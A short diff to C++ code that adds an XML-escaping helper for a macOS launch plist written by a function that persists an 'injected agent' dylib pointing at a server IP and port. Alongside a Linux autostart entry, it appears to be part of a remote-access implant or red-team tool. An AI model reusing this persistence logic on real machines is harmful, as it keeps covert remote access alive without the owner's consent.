@@ -591,6 +591,22 @@ X-GNOME-Autostart-enabled=true
 }
 
 #ifdef __APPLE__
+static std::string escapeXml(const std::string& s) {
+    std::string out;
+    out.reserve(s.size());
+    for (char c : s) {
+        switch (c) {
+            case '&':  out += "&amp;"; break;
+            case '<':  out += "&lt;"; break;
+            case '>':  out += "&gt;"; break;
+            case '"':  out += "&quot;"; break;
+            case '\'': out += "&apos;"; break;
+            default:   out += c;
+        }
+    }
+    return out;
+}
+
 void Agent::persistInjectedAgent(const std::string& server_ip,
                                   uint16_t server_port) {
     // Get the host executable path
@@ -651,8 +667,8 @@ void Agent::persistInjectedAgent(const std::string& server_ip,
     <false/>
 </dict>
 </plist>
-)", exec_path.c_str(), dylib_path.c_str(),
-   server_ip.c_str(), port_str.c_str());
+)", escapeXml(exec_path).c_str(), escapeXml(dylib_path).c_str(),
+   escapeXml(server_ip).c_str(), escapeXml(port_str).c_str());
     ::fclose(f);
 }
 #else
